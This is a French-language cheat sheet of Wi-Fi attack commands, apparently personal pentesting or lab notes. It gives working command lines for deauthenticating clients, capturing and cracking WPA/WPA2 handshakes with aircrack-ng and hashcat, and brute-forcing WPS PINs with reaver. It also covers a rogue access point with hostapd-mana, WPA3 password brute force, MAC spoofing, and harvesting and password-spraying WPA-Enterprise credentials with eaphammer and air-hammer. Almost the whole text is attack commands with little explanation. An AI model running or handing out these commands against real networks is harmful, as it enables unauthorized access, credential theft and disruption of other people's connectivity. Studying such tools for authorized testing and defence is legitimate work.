
## Connecter clef USB à Virtual Box

1. Menuf config : ajouter USB
2. En haut sur entrée --> cocher la clef USB
3. Si ne fonctionne pas (rien pendant le snif) --> changer de port

## Tuer les processus

```
sudo airmon-ng check
sudo airmon-ng check kill
```

## airmon-ng

```
sudo airmon-ng start wlan0 # récupérer le nom
sudo airmon-ng start wlan0 3 # ajouter le numéro de channel
sudo iw dev wlan0mon info
sudo iwconfig wlan0mon
sudo airmon-ng --verbose
sudo airmon-ng --debug
sudo airmon-ng stop wlan0mon
```

# Air* tools

## airodump-ng

```
sudo airodump-ng wlan0mon -c 2 # récupérer BSSID
sudo airodump-ng wlan0mon --band abg
```

```
-c : channel
-w : sortie dans un fichier
--bssid : capturer uniquement selon le BSSID
```

Explication :
```
BSSID : addresse MAC du point d'accès
PWD : niveau du signal
RXQ : qualité de la reception
Beacons : nombre de trames envoyées par l'AP
Data : nombre de paquet capturés
#/s : nombre de paquet / seconde
CH : numéro de channel
MB : vitesse maximale prise en charge par le point d'accès
ENC : algorithme de chiffrement
CIPHER : chiffrement detecté
AUTH : protocole d'authenfication
ESSID : SSID
```

```
sudo airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w cap1 wlan0mon
```

Note :
- pour récupérer handshakes, lancer attaque deauth

- tab : séléctionner
- espace : pause
- s : options de tri
- a : displays options
- i : inverse la sortie
- d : défaut
- m : colorier la séléction

## airoplay-ng

```
0	Deauthentication
1	Fake Authentication
2	Interactive Packet Replay
3	ARP Request Replay Attack
4	KoreK ChopChop Attack
5	Fragmentation Attack
6	Café-Latte Attack
7	Client-Oriented Fragmentation Attack
8	WPA Migration Mode Attack
9	Injection Test
```

```
-x nbpps	Number of packets per second
-p fctrl	Set frame control word (hex)
-a bssid	Access point MAC address
-c dmac	Destination MAC address
-h smac	Source MAC address
-e essid	Target AP SSID
-j	arpreplay attack: inject FromDS packets
-g value	Change ring buffer size (default: 8)
-k IP	Destination IP in fragments
-l IP	Source IP in fragments
-o npckts	Number of packets per burst (-1)
-q sec	Seconds between keep-alives (-1)
-y prga	Keystream for shared key authentication
-B	Bit rate test
-D	Disable AP detection
-F	Chooses first matching packet
-R	Disables /dev/rtc usage
```

```
sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon
sudo iwconfig wlan1mon channel 11
```

```
-0 1 : mode deauth, 1 envoie
```

## aircrack-ng

```
aircrack-ng -S
```

Cracker PSK (clef pré-partager)

Notes : 
- wpa et wpa2 même protocole
- wpa3 non vulnérable aux attaques hors-ligne (SAE)

```
aircrack-ng -w /usr/share/john/password.lst -e livebox -b 34:08:04:09:38:3D cap01.cap
```

### John

```
john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e livebox -w - ~/cap01.cap
```

### Crunch

```
crunch 11 11 -t password%%% | aircrack-ng -e livebox cap01.cap -w -
```

### Hashcat

```
/usr/lib/hashcat-utils/cap2hccapx.bin cap01.cap output.hccapx
hashcat -m 2500 --depreciated-check-disable output.hccapx /usr/share/john/password.lst

hcxpcapngtool -o hash.hc22000  cap01.cap
hashcat -a 0 -m  22000  hash.hc22000 /usr/share/john/password.lst
```

## airdecap-ng

Supprimer en-tête des fichiers non chiffrés

```
sudo airdecap-ng -b 34:08:04:09:3D:38 opennet-01.cap
```

Vérifier si on a déchiffrer le bon mot de passe

```
airdecap-ng -b 34:08:04:09:38:3D -e livebox-p 123123 cap01.cap
```

Notes :
- la clef est bonne si les packets sont déchiffrés

## airgraph-ng

```
airgraph-ng -o Picture1_png -i dump-01.csv -g CAPR
```

# Attaque WPS

```
wash -i wlan0mon
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K # Pixie
-p # code pin vide
```

# Usurper un point d'accès

```
sudo airodump-ng -w discovery --output-format pcap wlan0mon
```

```
kali@kali:~$ cat Mostar-mana.conf
interface=wlan0
ssid=Mostar
channel=1
hw_mode=g   # g pour 2,4 GHz et a pour 5
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP
cat Mostar-mana.conf
```

```
sudo hostapd-mana Mostar-mana.conf
sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
```

# WPA Entreprise

# Bruteforce ESSID

```
mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt
```

# Bruteforce WPA3

https://github.com/blunderbuss-wctf/wacker
```
./wacker.py --wordlist ~/rockyou-top100000.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462
```
La fréquence correspond au channel

# Changer adresse MAC

```
systemctl stop network-manager
ip link set wlan2 down
macchanger -m b0:72:bf:44:b0:49 wlan2
ip link set wlan2 up
```

# Connecter au wifi

```
## free.conf
network={
	ssid="$ESSID"
	key_mgmt=NONE
	scan_ssid=1
}

## wep.conf

network={
  ssid="wifi-old"
  key_mgmt=NONE
  wep_key0=11bb33cd55
  wep_tx_keyidx=0
}

## wpa.conf

network={
    ssid="nom_du_reseau"
    psk="mot_de_passe_du_reseau"
}

network={
  ssid="home_network"
  scan_ssid=1
  psk="correct battery horse staple"
  key_mgmt=WPA-PSK
}

## wpa3.conf

network={
    ssid="your_ssid"
    psk="your_password"
    key_mgmt=WPA-PSK SAE
}

sudo wpa_supplicant -Dnl80211 -iwlan2 -c free.conf
sudo wpa_supplicant -Dwext -iwlan1 -c web.conf
sudo wpa_supplicant -i wlan0 -c wifi-client.conf
sudo dhclient wlan2 -v # autre terminal


nmcli device status
nmcli device set wlan0 managed yes
nmcli device connect wlan0
nmcli dev wifi list
nmcli dev wifi connect "YOUR_SSID" password "YOUR_PASSWORD"
nmcli connection show
```

# Lister les IP

```
sudo arp-scan -I wlan5 -l
```

# WPA MGT

## Récupérer mot de passe

```
python3 ./eaphammer --cert-wizard
python3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced
```

Si deux AP : deux désauth

```
cat logs/hostapd-eaphammer.log | grep hashcat | awk '{print $3}' >> hashcat.5500
hashcat -a 0 -m 5500 hashcat.5500 ~/rockyou-top100000.txt --force
```

## BruteForce

```
echo 'CONTOSO\test' > test.user
./air-hammer.py -i wlan3 -e wifi-corp -p ~/rockyou-top100000.txt -u test.user
```

## Password Spray

```
cat ~/top-usernames-shortlist.txt | awk '{print "CONTOSO\\" $1}' > ~/top-usernames-shortlist-contoso.txt
./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u ~/top-usernames-shortlist-contoso.txt
```
